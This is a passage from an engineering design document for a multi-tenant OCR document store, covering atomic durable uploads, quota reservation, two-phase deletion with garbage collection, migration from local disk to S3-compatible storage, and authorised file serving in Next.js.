| anything else on the host | No | Not mounted. `cap_drop: ALL` removes `CAP_DAC_OVERRIDE`, so uid 10001 cannot bypass the `0700`. `no-new-privileges` blocks setuid escalation. |

This is a two-line configuration that turns "the app is careful about paths" into "the app is
*unable* to write elsewhere". It is the reason the residual TOCTOU in §3.3 attack 10 is acceptable
at M1.

### 4.4 Atomic write, durability, and disk-full

```ts
private async writeAtomic(
  abs: string,
  body: ReadableStream<Uint8Array>,
  opts: PutOptions,
): Promise<{ bytes: number; sha256: string }> {
  const dir = path.dirname(abs);
  await fsp.mkdir(dir, { recursive: true, mode: 0o700 });

  // Preflight: refuse the upload if it would breach the reserve. fsp.statfs verified available
  // in node v22.22.3 (bsize/blocks/bavail).
  const fsStat = await fsp.statfs(this.rootReal);
  const freeBytes = fsStat.bsize * fsStat.bavail;

  // When contentLength is ABSENT (chunked upload, §1.2) we cannot preflight the real size, so we
  // preflight the WORST CASE. The first draft used `(opts.contentLength ?? 0)`, which degenerates
  // to "is there 5 GiB free" and lets an unbounded chunked stream run until ENOSPC -- turning a
  // client-side 413 into a server-side disk-full incident that also takes out Postgres.
  const declared = opts.contentLength ?? MAX_UPLOAD_BYTES;     // MAX_UPLOAD_BYTES = 500 * 1024**2
  if (declared > MAX_UPLOAD_BYTES) {
    throw new StorageError('too-large', `declared ${declared} > max ${MAX_UPLOAD_BYTES}`); // -> 413
  }
  const need = declared + RESERVE_BYTES;                       // RESERVE_BYTES = 5 GiB
  if (freeBytes < need) {
    throw new StorageError('insufficient-space',
      `free ${freeBytes} < required ${need}`);                 // -> HTTP 507
  }

  const tmpPath = path.join(this.tmpReal, `${ulid().toLowerCase()}.part`);
  const hash = createHash('sha256');
  let bytes = 0;
  let committed = false;

  // O_EXCL|O_NOFOLLOW: atomic create-or-fail, cannot follow a planted link.
  const fh = await fsp.open(tmpPath, C.O_WRONLY | C.O_CREAT | C.O_EXCL | C.O_NOFOLLOW, 0o600);
  try {
    for await (const chunk of body) {                 // bounded memory: one chunk at a time
      hash.update(chunk);
      bytes += chunk.byteLength;
      // THE RUNNING CAP. A declared Content-Length is a client claim, not a fact: an attacker
      // sends `Content-Length: 1024` and then streams gigabytes, or omits it entirely. The
      // preflight above bounds the RESERVATION; this bounds the ACTUAL WRITE. Both are required.
      if (bytes > MAX_UPLOAD_BYTES) {
        throw new StorageError('too-large', `stream exceeded ${MAX_UPLOAD_BYTES} bytes`); // -> 413
      }
      if (opts.contentLength !== undefined && bytes > opts.contentLength) {
        throw new StorageError('too-large', 'stream longer than declared Content-Length');
      }
      await fh.write(chunk);
    }
    // A stream SHORTER than declared is also a mismatch -- it means a truncated upload, and
    // committing it would store a corrupt object with a valid-looking row.
    if (opts.contentLength !== undefined && bytes !== opts.contentLength) {
      throw new StorageError('checksum-mismatch',
        `declared ${opts.contentLength} bytes, received ${bytes}`);
    }
    const digest = hash.digest('hex');
    if (opts.expectedSha256 && opts.expectedSha256 !== digest) {
      throw new StorageError('checksum-mismatch', `expected ${opts.expectedSha256}, got ${digest}`);
    }

    // DURABILITY STEP 1: data + size metadata to stable storage BEFORE the rename.
    // Must NOT be swallowed: with delayed allocation (XFS/ext4), write() can succeed and fsync()
    // then fail with ENOSPC or EIO. This is where a full disk actually surfaces.
    await fh.sync();
    await fh.close();

    if (opts.ifAbsent) {
      // link() fails EEXIST atomically; rename() would silently clobber.
      await fsp.link(tmpPath, abs);
      await fsp.unlink(tmpPath);
    } else {
      await fsp.rename(tmpPath, abs);                 // atomic within one filesystem
    }
    committed = true;

    // DURABILITY STEP 2: fsync the PARENT DIRECTORY. Without this the rename itself can be lost
    // on power failure, leaving the object in tmp/ and the DB row pointing at nothing.
    // This is the step that is almost always omitted.
    const dfh = await fsp.open(dir, C.O_RDONLY | C.O_DIRECTORY);
    try { await dfh.sync(); } finally { await dfh.close(); }

    return { bytes, sha256: digest };
  } catch (err) {
    if (!committed) {
      try { await fh.close(); } catch { /* already closed */ }
      await fsp.unlink(tmpPath).catch(() => {});      // no partial object is ever visible
    }
    const code = (err as NodeJS.ErrnoException).code;
    if (code === 'ENOSPC') throw new StorageError('insufficient-space', 'disk full', { cause: err });
    if (code === 'EDQUOT') throw new StorageError('quota-exceeded', 'fs quota', { cause: err });
    if (code === 'EEXIST') throw new StorageError('already-exists', abs, { cause: err });
    throw err;
  }
}
```

**Disk-full behaviour, stated precisely.**

| Stage | Symptom | Result |
|---|---|---|
| Preflight `statfs` | `free < size + 5 GiB` | `507 Insufficient Storage`, nothing written. The 5 GiB reserve exists so the *system* (Postgres, journald) does not also wedge. |
| Mid-`write()` | `ENOSPC` | `.part` unlinked in `catch`. No object, no DB row (the row is written only after `put` resolves). |
| `fh.sync()` | `ENOSPC`/`EIO` after successful `write()`s | Caught because the return is awaited. **If `sync()` were fire-and-forget, a torn object would be renamed into place and the checksum would only be discovered at read time, months later.** |
| Post-`rename`, pre dir-fsync, power loss | rename lost | Object stays in `tmp/`, no DB row committed (transaction ordering, §5.2). Reaped by the `tmp/` sweeper. No dangling row. |

`tmp/` sweeper: a boot-time and hourly job unlinking `*.part` older than 24 h. Bounded because
`put` unlinks on every non-crash failure path.

### 4.5 Quota enforcement

**Decision: application-level quota is authoritative; filesystem quota is a backstop.**

**The ordering problem the first draft glossed over.** It called this "reserve-then-commit, inside
the upload transaction", but the actual flow in §4.4/§5.2 writes the bytes to disk *first* and
takes the `StorageObject` row *after* `put` resolves. If the quota is only checked in that later
transaction, then (a) the disk is already consumed before the tenant is told they are over quota,
(b) N concurrent uploads can each pass a check that none of them individually breaches, and
(c) every rejection leaves an orphan for the §5.4 sweeper. A quota enforced after the write is
not a quota; it is a report.

**The fix is a genuine two-phase reservation**, mirroring the two-phase delete in §5.2:

```sql
CREATE TABLE tenant_storage_usage (
  tenant_id     UUID PRIMARY KEY REFERENCES tenants(id),
  bytes_used    BIGINT NOT NULL DEFAULT 0 CHECK (bytes_used >= 0),   -- settled objects
  bytes_pending BIGINT NOT NULL DEFAULT 0 CHECK (bytes_pending >= 0),-- in-flight reservations
  bytes_quota   BIGINT NOT NULL,
  updated_at    TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE TABLE storage_reservations (
  id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  tenant_id   UUID NOT NULL REFERENCES tenants(id),
  bytes       BIGINT NOT NULL,
  object_key  VARCHAR(512),                     -- filled once the key is minted
  expires_at  TIMESTAMPTZ NOT NULL,             -- now() + upload timeout
  settled_at  TIMESTAMPTZ
);
CREATE INDEX ON storage_reservations (settled_at, expires_at);
```

**Phase 1 — reserve, BEFORE a single byte is written.** One atomic statement; the `WHERE` makes
check-and-increment indivisible, so there is no read-then-write race between concurrent uploads:

```sql
UPDATE tenant_storage_usage
   SET bytes_pending = bytes_pending + $2, updated_at = now()
 WHERE tenant_id = $1
   AND bytes_used + bytes_pending + $2 <= bytes_quota
RETURNING bytes_used, bytes_pending;
-- 0 rows -> StorageError('quota-exceeded') -> HTTP 413, and NOTHING has been written.
```

Reserved amount = `contentLength ?? MAX_UPLOAD_BYTES` — the same worst-case rule as the disk
preflight in §4.4, and for the same reason: an undeclared size must reserve the maximum or the
reservation is meaningless. The reservation is deliberately pessimistic; the settle step corrects it.

**Phase 2 — settle, in the same transaction as the `StorageObject` row:**

```sql
UPDATE tenant_storage_usage
   SET bytes_pending = GREATEST(0, bytes_pending - $reserved),
       bytes_used    = bytes_used + $actual,
       updated_at    = now()
 WHERE tenant_id = $1;
UPDATE storage_reservations SET settled_at = now() WHERE id = $reservationId;
```

**Failure paths, all of them:**

| What happens | Effect on quota |
|---|---|
| `put` throws (ENOSPC, checksum, too-large, client abort) | Compensating `bytes_pending -= reserved` in the `finally`. Bytes were never committed. |
| Process dies mid-upload | The compensating update never runs, so `bytes_pending` is inflated. A sweeper releases reservations where `settled_at IS NULL AND expires_at < now()`, running on the same schedule as the `tmp/` sweeper (§4.4). **This is why `expires_at` exists and why `bytes_pending` is a separate column from `bytes_used` — an inflated pending value self-heals; an inflated `bytes_used` would need a full recount.** |
| Reservation succeeds, object written, settle transaction rolls back | Object is an orphan, reaped by §5.4; reservation expires and is released. Quota is eventually exact. |

The row lock on `tenant_storage_usage` serialises same-tenant uploads, which is acceptable
(uploads are not the hot path) and is the price of an exact quota. Note the lock is now held only
for the two short `UPDATE`s, **not** for the duration of a 500 MB transfer — which the naive
"one transaction around the whole upload" reading of the first draft would have implied, and which
would have made a single slow uploader block every other upload for that tenant.

*Reconciliation:* a nightly job recomputes `bytes_used` as
`SUM(bytes) FROM storage_objects WHERE tenant_id = $1 AND deleted_at IS NULL` and alerts (does not
silently correct) on any drift. Drift is a bug, and auto-healing it hides the bug.

*Rejected:* XFS project quotas per tenant directory (`/etc/projects` + `xfs_quota -x -c 'limit
bhard=50g …'`). It works — `objects/{tenantId}/` is a clean project boundary — but it means an
out-of-band provisioning step on every tenant signup, it cannot express "soft warn at 80%", and it
reports `EDQUOT` rather than a billable event. *Would flip if:* a single-tenant on-prem deployment
where the FS quota is the customer's own contractual limit, or if app-level accounting is ever shown
to drift.

*Backstop retained:* one volume-level limit (the LVM volume size) plus a monitor alerting at 80%
of `bavail`. This catches a bug in the accounting.

---

## 5. Retention and deletion

### 5.1 The failure both naive orderings produce

| Order | Crash point | Result |
|---|---|---|
| Delete row, then object | after commit, before unlink | **Orphan file** — bytes remain, unbilled, undiscoverable, PDPA-non-compliant. |
| Delete object, then row | after unlink, before commit | **Dangling row** — UI shows the document, download 500s. |

Neither is acceptable, and no ordering fixes it, because a filesystem and a database cannot share
a transaction.

### 5.2 The two-phase design

Reuses the outbox pattern already proven in the sibling project
(`~/Documents/jawbong` ships `outbox_events` and `idempotency_records` per the orchestrator's brief;
**UNVERIFIED:** I did not read jawbong's outbox implementation — a grep of its `process/` tree found
only one incidental `storage` mention in a phase plan, so the pattern is adopted on the brief's
authority, not on inspected code).

**Phase 1 — synchronous, one transaction, no filesystem I/O:**

```ts
await prisma.$transaction(async (tx) => {
  await tx.document.update({
    where: { id: documentId },
    data: { deletedAt: new Date(), deletedBy: actorId },
  });
  const objects = await tx.storageObject.findMany({
    where: { documentId, deletedAt: null },
    select: { objectKey: true, bytes: true, kind: true },
  });
  await tx.storageObject.updateMany({ where: { documentId }, data: { deletedAt: new Date() } });
  await tx.storageGcQueue.createMany({
    data: objects.map((o) => ({
      objectKey: o.objectKey,
      tenantId,
      // regenerable derivatives go immediately; originals get an undelete window
      deleteAfter: o.kind === 'original'
        ? new Date(Date.now() + GRACE_DAYS * 86_400_000)
        : new Date(),
    })),
  });
  await tx.$executeRaw`UPDATE tenant_storage_usage
       SET bytes_used = GREATEST(0, bytes_used - ${totalBytes}) WHERE tenant_id = ${tenantId}::uuid`;
});
// API returns 204 here. The bytes still exist. That is correct and intentional.
```

**Phase 2 — asynchronous worker, at-least-once.** The first draft's sketch had three defects that
would each have caused silent data retention, so the corrected version is given in full:

```ts
// (1) CLAIM the batch with FOR UPDATE SKIP LOCKED. Without it, two workers select the same rows;
//     the deletes are idempotent so nothing corrupts, but the attempts counter is double-bumped
//     and a partial failure is misattributed. SKIP LOCKED is what makes horizontal scaling safe.
const batch = await prisma.$queryRaw<{ id: bigint; object_key: string }[]>`
  SELECT id, object_key FROM storage_gc_queue
   WHERE completed_at IS NULL AND delete_after <= now() AND attempts < ${MAX_ATTEMPTS}
   ORDER BY id
   LIMIT 1000
   FOR UPDATE SKIP LOCKED`;
if (batch.length === 0) return;

const keys = batch.map((r) => assertSafeObjectKey(r.object_key));   // revalidate on the way out

// (2) HANDLE PARTIAL FAILURE. deleteMany is all-or-throw (§1.2.2); on throw, `remaining` names
//     exactly the keys that survived. Only the OTHERS may be marked complete. The first draft
//     marked the whole batch complete unconditionally, which converts one transient S3 error
//     into permanently orphaned bytes and a queue row that says they are gone.
let failed: ReadonlySet<string> = new Set();
let lastError: string | null = null;
try {
  await storage.deleteMany(keys);
} catch (e) {
  if (e instanceof StorageError && e.code === 'partial-delete' && e.remaining) {
    failed = new Set(e.remaining);
    lastError = e.message;
  } else {
    failed = new Set(keys);                       // whole-batch failure (network, auth, 5xx)
    lastError = e instanceof Error ? e.message : String(e);
  }
}

const doneIds    = batch.filter((r) => !failed.has(r.object_key)).map((r) => r.id);
const failedIds  = batch.filter((r) =>  failed.has(r.object_key)).map((r) => r.id);

await prisma.$transaction([
  prisma.storageGcQueue.updateMany({
    where: { id: { in: doneIds } }, data: { completedAt: new Date() },
  }),
  // (3) ACTUALLY INCREMENT attempts AND RECORD THE ERROR, with exponential backoff pushing
  //     delete_after forward. The first draft's predicate filtered on `attempts < 10` but nothing
  //     in the code ever wrote `attempts`, so the "retry bounded" claim was prose only and a
  //     permanently-failing key would have been retried every cycle, forever, silently.
  prisma.$executeRaw`
    UPDATE storage_gc_queue
       SET attempts     = attempts + 1,
           last_error   = ${lastError},
           delete_after = now() + (interval '1 minute' * power(2, LEAST(attempts, 10)))
     WHERE id = ANY(${failedIds}::bigint[])`,
]);
```

A row that reaches `attempts >= MAX_ATTEMPTS` (10) drops out of the worker's predicate and is
**not** retried. It must therefore be surfaced: a monitor alerts on
`COUNT(*) WHERE completed_at IS NULL AND attempts >= 10`, because such a row means bytes exist that
the system believes are deleted — a PDPA-relevant condition, not a queue-hygiene nit.

**Why this is correct:**
- **No lost file→dangling row:** the queue row is only marked complete *after* the object is gone.
  A crash in between re-runs the delete, which is a no-op.
- **No orphan file:** the queue row commits atomically with the soft-delete. If the transaction
  rolls back, neither happened.
- **`delete` MUST be idempotent** — this is why it is a contract requirement in §1.2, not an
  implementation nicety. Local: swallow `ENOENT`. S3: `DeleteObject` already returns 204 for a
  missing key.
- **`deleteMany` MUST be all-or-throw** (§1.2.2). This is the second contract requirement the
  correctness argument rests on, and it is the one an adapter author is most likely to get wrong,
  because S3's `DeleteObjects` reports per-key failures inside an HTTP **200**.
- **Retry bounded:** `attempts < 10` with exponential backoff, *and the counter is actually
  written* (see the corrected Phase 2), then the row is alerted on rather than retried forever.

```prisma
model StorageGcQueue {
  id          BigInt    @id @default(autoincrement())
  tenantId    String    @map("tenant_id") @db.Uuid
  objectKey   String    @map("object_key") @db.VarChar(512)
  deleteAfter DateTime  @map("delete_after") @db.Timestamptz(6)
  attempts    Int       @default(0)
  lastError   String?   @map("last_error")
  completedAt DateTime? @map("completed_at") @db.Timestamptz(6)

  @@index([completedAt, deleteAfter])   // the worker's exact predicate
  @@map("storage_gc_queue")
}
```

### 5.3 Soft vs hard delete

| Entity | Policy | Rationale |
|---|---|---|
| `documents` row | **Soft** (`deleted_at`), retained indefinitely | Audit trail, undelete, "who deleted this" |
| `storage_objects` row | **Soft**, retained | Records that the key *existed* — needed to distinguish "deleted" from "never uploaded" during incident forensics |
| `original` bytes | **Hard**, after 30-day grace | Cost, and PDPA erasure |
| `page`/`thumbnail`/`derivative` bytes | **Hard**, immediately | Regenerable from the original at any time; zero reason to pay for them |
| `export` bytes | **Hard**, 7-day TTL from creation | Ephemeral artefacts |

**How the export TTL is actually enforced — because it cannot be a lifecycle rule.** §6.2 leak 7
bans S3 lifecycle *expiration* rules outright (they delete behind the GC's back and turn every
subsequent read into a false data-loss alert). The TTL is therefore enqueued at *creation* time,
not at deletion time: whenever an `export` object is written, the same transaction that inserts its
`StorageObject` row also inserts a `storage_gc_queue` row with
`deleteAfter = now() + 7 days`. One mechanism, one audit trail, and the export path needs no
special-case sweeper. The same applies to any future `kind` with a TTL.

**PDPA override.** Thailand's Personal Data Protection Act creates a right to erasure. An explicit
erasure command must set `deleteAfter = now()` for **all** kinds including `original`, bypassing the
grace period, and must also purge the OCR text from `documents.extracted_text`. The 30-day grace is
a product convenience, not a legal position. **UNVERIFIED:** I have not reviewed PDPA retention
obligations against a legal source; the erasure path is designed to be immediate so that whatever
the counsel-approved period turns out to be, it is a single constant.

### 5.4 Orphan GC for derivatives

Even with the outbox, orphans occur: a worker crashes after `storage.put` succeeds but before the
`StorageObject` row commits. That object has no row and no queue entry.

The reconciler is the **only** caller of `list`:

```ts
// tenantPrefix(t) is the sanctioned KeyPrefix constructor from §3.2.1 -- it takes a branded
// TenantId, so no request string can reach `list`.
for await (const page of listAllPages(storage, tenantPrefix(tenantId))) {
  const known = await prisma.storageObject.findMany({
    where: { objectKey: { in: [...page.keys] } }, select: { objectKey: true },
  });
  const knownSet = new Set(known.map((k) => k.objectKey));
  const orphans: ObjectKey[] = [];
  for (const key of page.keys) {
    if (knownSet.has(key)) continue;
    const st = await storage.stat(key);
    // 24h grace: never race an upload that is mid-flight or whose transaction has not committed
    if (st && Date.now() - st.modifiedAt.getTime() > 24 * 3_600_000) orphans.push(key);
  }
  if (orphans.length) await storage.deleteMany(orphans);
}
```

Schedule: weekly, off-peak, one tenant prefix at a time. The 24-hour grace is the critical
parameter — a shorter window deletes objects belonging to an uncommitted transaction.

The **inverse** check (rows whose object is missing) is what `existsMany` is for, and it runs in the
same job: a row with no object is a data-loss event and must alert, never auto-heal.

---

## 6. Migration off local disk

### 6.1 MinIO is not the target — evidence

The brief names MinIO. That recommendation must be **overturned**.

Verified 2026-09-09 via `https://api.github.com/repos/minio/minio`:

```
minio/minio      archived: True   license: AGPL-3.0  stars: 61371  pushed: 2026-04-24T17:54:39Z
                 latest release: RELEASE.2025-10-15T17-29-55Z  (published 2025-10-16)
```

`https://github.com/minio/minio` README: **"THIS REPOSITORY IS NO LONGER MAINTAINED."** The
repository is read-only; no reviewed patches, no official community binaries. The last release
predates today by ~11 months. The vendor directs users to commercial AIStor.

> **Re-verified 2026-09-09 by a second reviewer, and one claim narrowed.** `api.github.com/repos/minio/minio`
> returns `archived: true`, `license.spdx_id: AGPL-3.0`, `pushed_at: 2026-04-24T17:54:39Z`,
> `disabled: false`. **The API response contains no `archived_at` field**, so the *date* of
> archiving is not established by this evidence — the first draft's "Archived 25 April 2026"
> was an inference from `pushed_at` (the last commit push), which is a different event, and the
> conflicting secondary source (February 2026) cannot be adjudicated from the API either.
> **What is verified and what the decision actually rests on:** the repository *is* archived
> today, *is* AGPL-3.0, and has had no push since 2026-04-24. The exact archive date is immaterial
> to the rejection and is recorded here as UNVERIFIED rather than asserted.

**Adopting an archived object store as the primary data plane for a security product means running
an S3 implementation that will not receive security patches.** Rejected.

Verified alternatives, same query:

```
seaweedfs/seaweedfs   archived: False  license: Apache-2.0  stars: 34540  pushed: 2026-09-09T02:12:30Z
                      latest release: 4.46  (published 2026-09-08)
```

| Target | Verdict | Why |
|---|---|---|
| **Local disk** (M1) | **Chosen for M1** | Single VPS, single writer, no ops burden. Everything in §4 applies. |
| **SeaweedFS 4.46** | **Chosen for M2 self-hosted** | Apache-2.0 (no AGPL contamination of a commercial product — MinIO and Garage are both AGPL-3.0), actively released (yesterday), S3 gateway, strong small-file story which matches per-page images. |
| Managed S3 (`ap-southeast-1`) | **Chosen for M2 cloud** | Nearest region to Thailand; `52.221.213.43` in the orchestrator's brief is already an `ap-southeast-1` Lightsail host, so the account/region footprint exists. |
| Cloudflare R2 | Viable alternative | S3-compatible API, zero egress fees — attractive for a document-download-heavy product. **UNVERIFIED:** R2's `Range`, multipart, and checksum parity were not tested this session. |
| MinIO | **Rejected** | Archived, unmaintained, AGPL, commercial-upsell posture. |
| Garage | Rejected for now | Actively maintained but AGPL-3.0, and not hosted on GitHub (`api.github.com/repos/deuxfleurs/garage` returns nothing — it lives on `git.deuxfleurs.fr`), so the usual supply-chain tooling does not cover it. |
| Ceph RGW | Rejected | Operationally enormous for a single-product deployment. |

*What would change this:* if the deployment must be on-prem inside a customer's datacentre with an
existing Ceph cluster, use Ceph RGW. If AGPL is acceptable (pure SaaS, no distribution), Garage
becomes competitive on footprint.

### 6.2 What leaks through a careless abstraction — and the counter-measure now

This is the section that costs money later if skipped. Each leak is prevented by a decision **taken
today**, not by discipline later.

**1. Path separators.** In S3, `/` is an ordinary character in a flat key, not a separator. Code
that does `key.split(path.sep)` works on Linux and breaks on Windows; code that stores `\` in a key
produces an object literally named `a\b` on S3.
*Prevented by:* `ObjectKey` is always `/`-joined and validated ASCII (`\` is not in the alphabet).
`path.sep` appears **only** inside `local-file-storage.ts`. Enforced:
```js
// .dependency-cruiser.js
{ name: 'no-path-outside-local-adapter', severity: 'error',
  from: { pathNot: '^src/infrastructure/storage/local-file-storage\\.ts$' },
  to:   { path: '^node:path$', dependencyTypes: ['core'] } }
```

**2. Presigned URLs — the worst leak.** The moment `getUrl(key): string` enters the port, every
caller starts assuming a URL exists. The local adapter then has to fake one (an HMAC token plus a
bespoke route), the fake has different expiry semantics, and business logic quietly depends on
"the browser can fetch this directly" — which is precisely the property §7.1 says must never hold.
*Prevented by:* the port returns a `ReadableStream`, **never a URL** — which is precisely the
property §7.1 requires ("never static, always an authorised route"). Presigning lives in the
separate `PresignCapable` interface that only `src/app/**` may feature-detect:
```js
{ name: 'presign-is-transport-only', severity: 'error',
  from: { pathNot: '^src/(app|infrastructure)/' },
  to:   { path: '^src/domain/storage/types$', via: 'PresignCapable' } }
```

**3. Consistency.** S3 has had strong read-after-write for PUTs, DELETEs, and LIST since December
2020, so the classic "wrote then 404" is gone. The residual difference is `list`: local `readdir`
would show `tmp/` if `tmp/` were inside the tree (it is not, §4.1), and S3 list is paginated at
1000 keys with a continuation token while local is not.
*Prevented by:* `list` returns `ListPage { keys, cursor }` from day one, so the local adapter is
**forced** to implement pagination and callers are forced to loop. A `list(): Promise<ObjectKey[]>`
signature would work locally and silently truncate at 1000 on S3.
*Correction to a stale line in §1.1:* the local walk does **not** need to "skip `tmp/`" — §4.1
places `tmp/`, `quarantine/`, and `trash/` as siblings of `objects/`, and `STORAGE_ROOT` points at
`objects/` (§4.3), so they are outside the adapter's root entirely and are unreachable by any key.
That is the stronger arrangement: an exclusion list is a rule someone can forget, whereas a root
that does not contain the directory is structural.

**4. Checksums.** S3's `ETag` is an MD5 **only** for single-part uploads that are plaintext or
SSE-S3 encrypted; it is *not* an MD5 under SSE-C or SSE-KMS, and never for multipart. For multipart
it is `md5(concat(part_md5s))-{n}` — a different value for the same bytes depending on part size.
Code that treats `ETag` as a content hash is wrong the day an object crosses the multipart threshold.
*Prevented by:* the port computes **SHA-256 while streaming** and returns it in `PutResult`; it is
persisted in `storage_objects.sha256`. `ETag` is never read. Both adapters produce the identical
value for identical bytes.

> **CORRECTION — the first draft fell into this exact trap one layer up.** It said "the S3 adapter
> additionally sets `ChecksumAlgorithm: 'SHA256'` so S3 verifies the transfer independently."
> That is only true for a **single-part** upload. Verified against
> <https://docs.aws.amazon.com/AmazonS3/latest/userguide/checking-object-integrity-upload.html>
> this session, AWS's own table reads:
>
> | Checksum algorithm | Full object | Composite |
> |---|---|---|
> | CRC-64/NVME, CRC-32, CRC-32C | **Yes** | (CRC32/32C also yes) |
> | **SHA-1, SHA-256**, MD5, SHA-512, XXHash* | **No** | Yes |
>
> and the page states: *"Full object checksums in multipart uploads are only available for
> CRC-based checksums because they can linearize into a full object checksum… This type of
> validation isn't available for other algorithms, such as SHA and MD5."*
>
> So for any object above `partSize` — i.e. anything over 16 MiB, which is most scanned PDFs —
> `x-amz-checksum-sha256` holds `sha256(concat(part_sha256s))` with an `-N` suffix, **not** the
> object's SHA-256. It is the ETag mistake wearing a SHA-256 costume, and §6.3's migration
> verifier (steps 3–4) would have compared it against `storage_objects.sha256` and reported a
> false mismatch on every large object.

*Corrected S3 adapter contract:*

| Concern | Mechanism | Why |
|---|---|---|
| Canonical content identity | **our own streaming SHA-256**, in `storage_objects.sha256` | Backend-independent, byte-exact, identical across local/S3/SeaweedFS. The only value business logic, dedup (§2.3), and `ETag` headers (§7.2) ever use. |
| S3-side transit integrity | `ChecksumAlgorithm: 'CRC32C'` with `ChecksumType: 'FULL_OBJECT'` | CRC-based, so it *is* a true whole-object checksum on multipart. S3 validates server-side and rejects with `BadDigest` on mismatch. (If unset, S3 now defaults to full-object `CRC64NVME`, which is also acceptable.) |
| SHA-256 visible to S3 tooling | `Metadata: { sha256: <hex> }` → `x-amz-meta-sha256` | User metadata is opaque to S3 and survives copy, so the canonical hash is inspectable from the console/CLI **without** pretending it is an S3 checksum. |

Never set `ChecksumAlgorithm: 'SHA256'` on this adapter: it costs a per-part hash computation and
produces a value that is guaranteed to be misinterpreted by the next person who reads it.
*Additional trap, same page:* a `CopyObject` recomputes the checksum as a direct full-object hash,
so a multipart object's stored checksum **changes on copy even though the bytes do not** — another
reason the migration verifier (§6.3 step 4) must compare our own metadata value, never S3's.

**5. Multipart.** S3 limits (re-verified this session,
<https://docs.aws.amazon.com/AmazonS3/latest/userguide/qfacts.html>): part size **5 MiB–5 GiB**,
max **10 000 parts**, max object **48.8 TiB**, no minimum on the last part, max 1000 parts returned
per `ListParts`. Separately (AWS CLI reference, same session): **a single `PutObject` is capped at
5 GB**, which — together with its `Content-Length` requirement — is the second reason the adapter
must switch to multipart, not merely a size-efficiency preference.
*Prevented by:* the S3 adapter uses `@aws-sdk/lib-storage@3.1128.0`'s `Upload` with
`partSize: 16 * 1024 * 1024, queueSize: 4` — 16 MiB × 10 000 = 160 GiB ceiling, far above any
document, with a bounded peak RSS of ~64 MiB. Part numbers never appear in a signature.
*Corollary:* our own max-upload limit must be set well below the S3 ceiling anyway
(`MAX_UPLOAD_BYTES = 500 MB`, §4.4, matching the brief's stated worst case). Note the ordering
consequence: because 500 MB < 5 GB, our own cap fires long before any S3 limit, so the S3 ceilings
are documented here as *headroom evidence*, not as live constraints.
*Also required, and easy to forget:* an **`AbortIncompleteMultipartUpload` lifecycle rule** (7 days).
This is the one lifecycle rule permitted alongside the expiration ban in leak 7 — it deletes only
*unfinished upload parts*, which are invisible to `list`, absent from `storage_objects`, and billed.
It can never delete a completed object, so it cannot delete behind the GC's back.

**6. IAM.** Local failures are `EACCES`; S3 failures are `AccessDenied`. Code that branches on
either is unportable.
*Prevented by:* the `StorageError` union in §1.2. Adapters translate; callers switch on
`error.code`. No `errno`, no HTTP status, no AWS error name escapes the adapter.

**7. Lifecycle rules deleting objects behind the GC's back.** An S3 lifecycle *expiration* rule
would delete objects that `storage_objects` still claims exist, turning every read into a
data-loss alert.
*Prevented by:* a written operating rule — **no S3 lifecycle expiration rules, ever.** Deletion is
application-driven via `storage_gc_queue` (§5). Lifecycle **transition** rules (Standard → Standard-IA
after 90 days) are permitted and encouraged. Enforce by asserting bucket lifecycle configuration in
the deploy pipeline.

**8. Encryption at rest.** SSE-S3/SSE-KMS on S3; LUKS on the VPS volume. Neither belongs in the port.
*Prevented by:* deployment config only. If SSE-C (customer-provided keys) is ever required, the key
material must go in the adapter constructor, never in a per-call option — a per-call `sseKey`
parameter would leak KMS into application code.
*Coupling to leak 4:* enabling SSE-KMS or SSE-C also makes `ETag` stop being an MD5 even for
single-part uploads. Since we never read `ETag`, this costs us nothing — but it is the reason the
"never read `ETag`" rule is absolute rather than "only for large objects".

**9. `ifAbsent` — the local implementation does not generalise.** §4.4 implements `ifAbsent` with
`link()` + `unlink()`, which is atomic create-or-`EEXIST` on a POSIX filesystem. S3 has no `link`,
and the naive S3 port ("`HeadObject`, then `PutObject` if absent") is a TOCTOU race that silently
loses one of two concurrent writes. The first draft put `ifAbsent` in the port without saying how
S3 would honour it — exactly the kind of unstated gap that becomes a data-loss bug during migration.
*Prevented by:* the S3 adapter implements it as a **conditional write** —
`PutObjectCommand({ ..., IfNoneMatch: '*' })`, which uploads only if the key does not already
exist and otherwise fails with **412 Precondition Failed** (verified against
<https://docs.aws.amazon.com/AmazonS3/latest/userguide/conditional-writes.html>; requires SigV4,
which the v3 SDK uses by default). The adapter maps 412 → `StorageError('already-exists')`, so both
backends produce the identical error code and no caller can tell them apart.
*Consequence for the port:* `ifAbsent` is **not** optional-best-effort. Any future backend that
cannot offer an atomic create-or-fail must reject at construction time rather than degrade to a
check-then-write, because §4.4's overwrite-safety argument depends on atomicity, not on politeness.

### 6.3 The migration procedure itself

The port makes this a **data** migration with **zero business-logic change**:

1. Deploy the S3 adapter alongside local; `STORAGE_DRIVER=local` still.
2. Dual-write behind a flag (`put` to both, read from local) for one week — proves the S3 path.
3. Backfill: for each `storage_objects` row, `localStorage.get` → `s3Storage.put`, then compare
   the **SHA-256 recomputed by our own streaming hash** against `storage_objects.sha256`.
   **`objectKey` is unchanged** — this is the entire payoff of a server-minted, separator-safe,
   ASCII key. *Do not compare `x-amz-checksum-sha256`* — per the correction in §6.2 leak 4 it is a
   composite value for any multipart object and will report a false mismatch on every file over
   16 MiB. The comparison is: our hash of the bytes we just streamed, vs the DB column.
4. Verify: `existsMany` over every row against S3; the count must equal the row count exactly, and
   a spot-check re-reads a random 1% and re-hashes end-to-end.
5. Flip `STORAGE_DRIVER=s3`. Keep the local volume read-only for 30 days.
6. `list` the local tree for anything the DB does not know about (§5.4) before destroying the volume.

Estimated backfill throughput: **UNVERIFIED** — depends on VPS egress bandwidth, which I could not
measure without contacting a production host (prohibited this session).

---

## 7. Serving files back to the browser

### 7.1 Never static, always a route

`/data/ocr-files` is outside the application directory and is never referenced by
`next.config.ts`, never symlinked into `public/`, and never served by a web server `root`/`alias`
directive. There is no reverse-proxy `location /files/ { root /data/ocr-files; }` — that single
line would defeat every control below, and it is the most common way this goes wrong.

```ts
// src/app/api/documents/[documentId]/objects/[objectId]/route.ts
import { after } from 'next/server';

export const dynamic = 'force-dynamic';       // never cached by the framework
export const runtime = 'nodejs';              // fs access; not edge

// The URL segments are attacker-controlled strings. They are used ONLY inside a WHERE clause, but
// they must still be shape-validated BEFORE reaching Prisma: a non-UUID string against a @db.Uuid
// column raises a Prisma error (not a null result), which surfaces as a 500 and is DISTINGUISHABLE
// from the uniform 404 below -- reintroducing the existence/validity oracle the 404 was designed
// to close. Zod at the boundary, per the house convention.
